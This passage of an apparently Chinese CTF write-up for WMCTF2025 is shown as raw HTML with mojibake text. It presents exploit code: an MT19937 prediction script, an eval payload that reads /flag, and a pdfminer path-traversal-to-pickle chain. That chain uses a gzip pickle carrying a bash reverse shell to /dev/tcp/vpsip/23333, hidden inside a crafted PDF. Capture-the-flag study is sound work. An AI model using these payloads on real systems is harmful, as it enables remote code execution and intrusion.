punctuation">:</span>        arr<span class="token punctuation">.</span>append<span class="token punctuation">(</span>l<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment">#ç¬¬ä¸‰ä½æ•°æˆ–ä¸‰çš„å€æ•°ä½å°±æ˜¯32ä½æ•°ï¼Œç›´æ¥åŠ å…¥</span>    <span class="token keyword">elif</span> i <span class="token operator">%</span> <span class="token number">3</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        arr<span class="token punctuation">.</span>append<span class="token punctuation">(</span>l<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&amp;</span>                   <span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">**</span><span class="token number">32</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment">#64ä½æ•°ï¼ŒåŒ…å«ä¸¤ä¸ª32ä½æ•°ï¼Œå–ç¬¬ä¸€ä¸ª32ä½æ•°ï¼Œ64ä½ä¸32ä¸ª1æŒ‰ä½ä¸ï¼Œç»“æœå‰©ä¸‹ä½ä½32ä½</span>        arr<span class="token punctuation">.</span>append<span class="token punctuation">(</span>l<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">32</span><span class="token punctuation">)</span>  <span class="token comment">#å³ç§»32ä½ï¼Œä¿ç•™é«˜ä½32ä½</span>    <span class="token comment"># else:</span>    <span class="token comment">#     arr.append(l[i] &amp; (2**32 - 1))  #ä¿ç•™ä½32ä½</span>    <span class="token comment">#     arr.append(l[i] &amp; (2**64 - 1) >> 32)  #ä¿ç•™ä¸­é—´32ä½</span>    <span class="token comment">#     arr.append(l[i] >> 64)  #ä¿ç•™é«˜32ä½</span>rc <span class="token operator">=</span> RandCrack<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment">#è§£é¢˜å…³é”®å‡½æ•°</span><span class="token keyword">for</span> i <span class="token keyword">in</span> arr<span class="token punctuation">:</span>    rc<span class="token punctuation">.</span>submit<span class="token punctuation">(</span>i<span class="token punctuation">)</span>  <span class="token comment">#æŒ‰é¡ºåºä¼ å…¥RandCrackå‡½æ•°</span>flag <span class="token operator">=</span> rc<span class="token punctuation">.</span>predict_getrandbits<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>  <span class="token comment">#é¢„æµ‹ä¸‹ä¸€ä¸ª32ä½æ•°</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™æ ·å°±èƒ½é¢„æµ‹æ¯ 624 ä¸ªæ•°çš„ä¸‹ä¸€ä¸ªæ•°äº†ï¼Œäºæ˜¯å°±å¯ä»¥æ‰“ payload ï¼Œç»“æœå‘ç°è¿™é‡Œæœ‰ä¸ªå¤§éé¢„æœŸ</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">eval</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">'__builtin__'</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>bro ä»¥ä¸ºè‡ªå·±æ˜¯ py2ï¼Œåº”è¯¥æ˜¯ builtins çš„ï¼Œé‚£ç›´æ¥æ‰“äº†</p><p>expï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> re<span class="token keyword">import</span> MT19937_expecturl <span class="token operator">=</span> <span class="token string">"http://49.232.42.74:32642/api"</span>key <span class="token operator">=</span> MT19937_expect<span class="token punctuation">.</span>expect_mt19937<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># for _ in range(624):</span>cookie <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"session"</span><span class="token punctuation">:</span>    <span class="token string">"eyJ1c2VyX2lkIjoiMzc4NzkzOTc3NSIsInVzZXJuYW1lIjoidGVzdCJ9.aM56QQ.z3U3JDKwnAzLDmX4K4Xe23mgqiM"</span><span class="token punctuation">&#125;</span>data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"key"</span><span class="token punctuation">:</span> key<span class="token punctuation">,</span> <span class="token string">"payload"</span><span class="token punctuation">:</span> <span class="token string">"__import__('os').system('cat /flag > static/1.txt')"</span><span class="token punctuation">&#125;</span>response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> json<span class="token operator">=</span>data<span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookie<span class="token punctuation">,</span>proxies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"http"</span><span class="token punctuation">:</span><span class="token string">"http://127.0.0.1:8083"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token string">"Not Allowed:"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"random.txt"</span><span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"\n"</span> <span class="token operator">+</span> key<span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    num <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r"(\d+)"</span><span class="token punctuation">,</span> response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"random.txt"</span><span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"\n"</span> <span class="token operator">+</span> num<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="pdf2textï¼ˆå¤ç°ï¼‰"><a href="#pdf2textï¼ˆå¤ç°ï¼‰" class="headerlink" title="pdf2textï¼ˆå¤ç°ï¼‰"></a>pdf2textï¼ˆå¤ç°ï¼‰</h1><p>é“¾å­è·Ÿå‡ºæ¥äº†æœ€åæ­»åœ¨ä¼  gz ä¸Šäº†</p><p>app.py</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> send_file<span class="token punctuation">,</span> render_template<span class="token keyword">from</span> pdfminer<span class="token punctuation">.</span>pdfparser <span class="token keyword">import</span> PDFParser<span class="token keyword">from</span> pdfminer<span class="token punctuation">.</span>pdfdocument <span class="token keyword">import</span> PDFDocument<span class="token keyword">import</span> os<span class="token punctuation">,</span> io<span class="token keyword">from</span> pdfutils <span class="token keyword">import</span> pdf_to_textapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'UPLOAD_FOLDER'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'uploads'</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'MAX_CONTENT_LENGTH'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">1024</span>  <span class="token comment"># 2MB limit</span>os<span class="token punctuation">.</span>makedirs<span class="token punctuation">(</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'UPLOAD_FOLDER'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> exist_ok<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/upload'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">upload_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">'file'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>files<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'No file part'</span><span class="token punctuation">,</span> <span class="token number">400</span>        <span class="token builtin">file</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span>    filename <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>filename    <span class="token keyword">if</span> filename <span class="token operator">==</span> <span class="token string">''</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'No selected file'</span><span class="token punctuation">,</span> <span class="token number">400</span>        <span class="token keyword">if</span> <span class="token string">'..'</span> <span class="token keyword">in</span> filename <span class="token keyword">or</span> <span class="token string">'/'</span> <span class="token keyword">in</span> filename<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'directory traversal is not allowed'</span><span class="token punctuation">,</span> <span class="token number">403</span>     pdf_path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'UPLOAD_FOLDER'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span>    pdf_content <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>stream<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token comment"># just if is a pdf</span>        parser <span class="token operator">=</span> PDFParser<span class="token punctuation">(</span>io<span class="token punctuation">.</span>BytesIO<span class="token punctuation">(</span>pdf_content<span class="token punctuation">)</span><span class="token punctuation">)</span>        doc <span class="token operator">=</span> PDFDocument<span class="token punctuation">(</span>parser<span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">500</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>pdf_path<span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>pdf_content<span class="token punctuation">)</span>    md_filename <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>splitext<span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">'.txt'</span>    txt_path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'UPLOAD_FOLDER'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> md_filename<span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        pdf_to_text<span class="token punctuation">(</span>pdf_path<span class="token punctuation">,</span> txt_path<span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">500</span>         <span class="token keyword">return</span> send_file<span class="token punctuation">(</span>txt_path<span class="token punctuation">,</span> as_attachment<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">5000</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>pdfutils.py</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pdfminer<span class="token punctuation">.</span>high_level <span class="token keyword">import</span> extract_pages<span class="token keyword">from</span> pdfminer<span class="token punctuation">.</span>layout <span class="token keyword">import</span> LTTextContainer<span class="token keyword">def</span> <span class="token function">pdf_to_text</span><span class="token punctuation">(</span>pdf_path<span class="token punctuation">,</span> txt_path<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>txt_path<span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> txt<span class="token punctuation">:</span>        <span class="token keyword">for</span> page_layout <span class="token keyword">in</span> extract_pages<span class="token punctuation">(</span>pdf_path<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> element <span class="token keyword">in</span> page_layout<span class="token punctuation">:</span>                <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>element<span class="token punctuation">,</span> LTTextContainer<span class="token punctuation">)</span><span class="token punctuation">:</span>                    txt<span class="token punctuation">.</span>write<span class="token punctuation">(</span>element<span class="token punctuation">.</span>get_text<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                    txt<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æºç é€»è¾‘å¾ˆç®€å•ï¼Œæ–‡ä»¶æ“ä½œè¿™é‡ŒæŠŠç›®å½•ç©¿è¶Š ban æ‰äº†ï¼Œé‚£ä¼°è®¡å°±æ˜¯ä» pdfminer è‡ªèº«å…¥æ‰‹</p><p>ä½†æ˜¯ä¸€ä¸ª pdf è½¬æ–‡æœ¬çš„åº“èƒ½æœ‰ä»€ä¹ˆåå¿ƒæ€å‘¢ï¼Œæ€»ä¸èƒ½ä¸“é—¨ç»™ä¸ª eval ï¼Ÿç¨åŠ æ€ç´¢ï¼Œåœ¨è¿™ä¸ªåº“é‡Œé¢æœäº†ä¸€ä¸‹ <code>pickle.load</code>ï¼Œç»“æœè¿˜çœŸæœ‰</p><p><img src="/blog/2025/09/20/WMCTF2025/IMG-20250920192658903.png"></p><p>hint ä¹Ÿæ˜¯éªŒè¯äº†è¿™ä¸€ç‚¹</p><p>å¤šæ¬¡è°ƒè¯•ä¹‹åå¾—åˆ°è°ƒç”¨æ ˆå¦‚ä¸‹ï¼š</p><pre class="line-numbers language-none"><code class="language-none">CMapDB.get_cmapCMapDB._load_dataPDFCIDFont.get_cmap_from_specPDFCIDFont.__init__PDFResourceManager.get_fontPDFPageInterpreter.init_resourcesPDFPageInterpreter.render_contentshigh_level.extract_pages<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2025/09/20/WMCTF2025/IMG-20250921102056771.png"></p><p><img src="/blog/2025/09/20/WMCTF2025/IMG-20250921102135112.png"></p><p><img src="/blog/2025/09/20/WMCTF2025/IMG-20250921102448451.png"></p><p>è€Œæœ€åè¿™é‡Œ</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@classmethod</span><span class="token keyword">def</span> <span class="token function">_load_data</span><span class="token punctuation">(</span>cls<span class="token punctuation">,</span> name<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> Any<span class="token punctuation">:</span>    name <span class="token operator">=</span> name<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\0"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span>    filename <span class="token operator">=</span> <span class="token string">"%s.pickle.gz"</span> <span class="token operator">%</span> name    log<span class="token punctuation">.</span>debug<span class="token punctuation">(</span><span class="token string">"loading: %r"</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span>    cmap_paths <span class="token operator">=</span> <span class="token punctuation">(</span>        os<span class="token punctuation">.</span>environ<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"CMAP_PATH"</span><span class="token punctuation">,</span> <span class="token string">"/usr/share/pdfminer/"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"cmap"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">)</span>    <span class="token keyword">for</span> directory <span class="token keyword">in</span> cmap_paths<span class="token punctuation">:</span>        path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>directory<span class="token punctuation">,</span> filename<span class="token punctuation">)</span>        <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">:</span>            gzfile <span class="token operator">=</span> gzip<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token builtin">type</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>gzfile<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¾ˆæ˜æ˜¾ os.path.join ä¸­çš„ filename å¯æ§å°±ä¼šå‡ºç°ç›®å½•ç©¿è¶Šçš„æƒ…å†µ</p><p>ç»¼åˆä¸€ä¸‹åˆ¤æ–­æ¡ä»¶å¯ä»¥å¾—åˆ°å¿…è¦çš„å‡ æ®µï¼Œæ³¨æ„ pdf è¯­æ³•ä¸­ä½¿ç”¨ <code>#</code> å¯ä»¥å®ç°å¯¹ <code>/</code> è¿›è¡Œç¼–ç ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨å€¼é‡Œé¢æ·»åŠ è·¯å¾„</p><pre class="line-numbers language-pdf" data-language="pdf"><code class="language-pdf">&#x2F;Type&#x2F;Font&#x2F;Encoding &#x2F;#2Fapp#2Fuploads#2F1&#x2F;Subtype&#x2F;CIDFontType0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>è¿™æ ·å­å°±èƒ½åšåˆ° pickle.loads æˆ‘ä»¬ gzip å‹ç¼©åçš„ pkl äº†</p><p>æ¥ä¸‹æ¥å°±æ˜¯æœ€è‰°éš¾çš„éƒ¨åˆ†äº†ï¼Œæˆ‘ä»¬æ€ä¹ˆä¸Šä¼ ä¸€ä¸ª gzip å‹ç¼©åŒ…åŒæ—¶è¦è¿‡ pdf æ£€æµ‹</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">try</span><span class="token punctuation">:</span>    <span class="token comment"># just if is a pdf</span>    parser <span class="token operator">=</span> PDFParser<span class="token punctuation">(</span>io<span class="token punctuation">.</span>BytesIO<span class="token punctuation">(</span>pdf_content<span class="token punctuation">)</span><span class="token punctuation">)</span>    doc <span class="token operator">=</span> PDFDocument<span class="token punctuation">(</span>parser<span class="token punctuation">)</span><span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">500</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æµ‹è¯•å¯ä»¥å‘ç° pdf æ£€æµ‹åªæ£€æµ‹ä¸‹é¢è¿™æ®µæ˜¯å¦åœ¨æœ«å°¾</p><pre class="line-numbers language-pdf" data-language="pdf"><code class="language-pdf">trailer&lt;&lt;&#x2F;Root 1 0 R&gt;&gt; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>ä½†æ˜¯å’Œæ­£å¸¸å‘½ä»¤è¡Œçš„ <code>gzip -d</code> ä¸ä¸€æ ·ï¼Œpython çš„ gzip è§£å‹ç¼©æå…¶ä¸¥æ ¼ï¼Œå³ä½¿åœ¨ gzip åŒ…çš„æœ€åè¿½åŠ æ˜æ–‡ä¹Ÿä¼šåˆ¤å®šä¸ºä¸é€šè¿‡</p><br>å…¶å®ï¼Œgzip å¯ä»¥æŒ‡å®šå‹ç¼©ç­‰çº§ï¼Œç­‰çº§ä¸º 0 åŸºæœ¬éƒ½æ˜¯æ˜æ–‡ï¼Œç„¶åå°±å‡ºäº†...<p>expï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gzipsource <span class="token operator">=</span> <span class="token triple-quoted-string string">b"""cossystemp00g0(S'bash -c "bash -i >&amp; /dev/tcp/vpsip/23333 0>&amp;1"'tR."""</span><span class="token keyword">with</span> gzip<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"1.pickle.gz"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f_out<span class="token punctuation">:</span>    f_out<span class="token punctuation">.</span>write<span class="token punctuation">(</span>source<span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"1.pdf"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fin<span class="token punctuation">:</span>    pdf_content <span class="token operator">=</span> fin<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> gzip<span class="token punctuation">.</span>compress<span class="token punctuation">(</span>pdf_content<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"1.pickle.gz"</span><span class="token punctuation">,</span> <span class="token string">"ab"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f_out<span class="token punctuation">:</span>        f_out<span class="token punctuation">.</span>write<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>1.pdf</p><pre class="line-numbers language-pdf" data-language="pdf"><code class="language-pdf">%PDF-1.4%DUMMY8 0 obj&lt;&lt;&#x2F;PatternType 2&#x2F;Shading&lt;&lt;  &#x2F;Function&lt;&lt;    &#x2F;Domain[0 1]    &#x2F;C0[0 0 1]    &#x2F;C1[1 0.6 0]    &#x2F;N 1    &#x2F;FunctionType 2  &gt;&gt;  &#x2F;ShadingType 2  &#x2F;Coords[46 400 537 400]  &#x2F;Extend[false false]  &#x2F;ColorSpace&#x2F;DeviceRGB&gt;&gt;&#x2F;Type&#x2F;Pattern&gt;&gt;endobj5 0 obj&lt;&lt;&#x2F;Widths[573 0 582 0 548 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 573 0 573 0 341]&#x2F;Type&#x2F;Font&#x2F;BaseFont&#x2F;PAXEKO+SourceSansPro-Bold&#x2F;LastChar 102&#x2F;Encoding &#x2F;#2Fapp#2Fuploads#2F1&#x2F;FontMatrix [0.1 0 0 0.1 0 (1\);\nprint\(&quot;&quot;\)\n&#x2F;&#x2F;)]&#x2F;Subtype&#x2F;CIDFontType0&#x2F;FirstChar 65&#x2F;FontDescriptor 9 0 R&#x2F;ToUnicode 11 0 R&gt;&gt;endobj2 0 obj&lt;&lt;&#x2F;Kids[3 0 R]&#x2F;Type&#x2F;Pages&#x2F;Count 1&gt;&gt;endobj9 0 obj&lt;&lt;&#x2F;Type&#x2F;FontDescriptor&#x2F;ItalicAngle 0&#x2F;Ascent 751&#x2F;FontBBox[-6 -12 579 713]&#x2F;FontName&#x2F;PAXEKO+SourceSansPro-Bold&#x2F;StemV 100&#x2F;CapHeight 713&#x2F;Flags 32&#x2F;FontFile3 10 0 R&#x2F;Descent -173&#x2F;MissingWidth 250&gt;&gt;endobj6 0 obj&lt;&lt;&#x2F;Length 128&gt;&gt;stream47 379 489 230 re S&#x2F;Pattern csBT  50 500 Td  117 TL  &#x2F;F1 150 Tf  &#x2F;P1 scn  (AbCdEf) Tj  &#x2F;P2 scn  (AbCdEf) &#39;\nETendstreamendobj3 0 obj&lt;&lt;&#x2F;Type&#x2F;Page&#x2F;Resources 4 0 R&#x2F;Contents 6 0 R&#x2F;Parent 2 0 R&#x2F;MediaBox[0 0 595.2756 841.8898]&gt;&gt;endobj10 0 obj&lt;&lt;&#x2F;Length 800&#x2F;Subtype&#x2F;Type2&gt;&gt;streamendstreamendobj7 0 obj&lt;&lt;&#x2F;PatternType 1&#x2F;Matrix[1 0 0 1 50 0]&#x2F;Length 58&#x2F;TilingType 1&#x2F;BBox[0 0 16 16]&#x2F;YStep 16&#x2F;PaintType 1&#x2F;Resources&lt;&lt;&gt;&gt;&#x2F;XStep 16&gt;&gt;stream0.65 g0 0 16 16 re f0.15 g0 0 8 8 re f8 8 8 8 re fendstreamendobj4 0 obj&lt;&lt;&#x2F;Pattern&lt;&lt;  &#x2F;P1 7 0 R  &#x2F;P2 8 0 R&gt;&gt;&#x2F;Font&lt;&lt;  &#x2F;F1 5 0 R&gt;&gt;&gt;&gt;endobj1 0 obj&lt;&lt;&#x2F;Pages 2 0 R&#x2F;Type&#x2F;Catalog&#x2F;OpenAction[3 0 R &#x2F;Fit]&gt;&gt;endobjxref0 110000000000 65535 f0000002260 00000 n0000000522 00000 n0000000973 00000 n0000002178 00000 n0000000266 00000 n0000000794 00000 n0000001953 00000 n0000000015 00000 n0000000577 00000 n0000001085 00000 ntrailer&lt;&lt;&#x2F;ID[(DUMMY) (DUMMY)]&#x2F;Root 1 0 R&#x2F;Size 11&gt;&gt;startxref2333%%EOF<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span><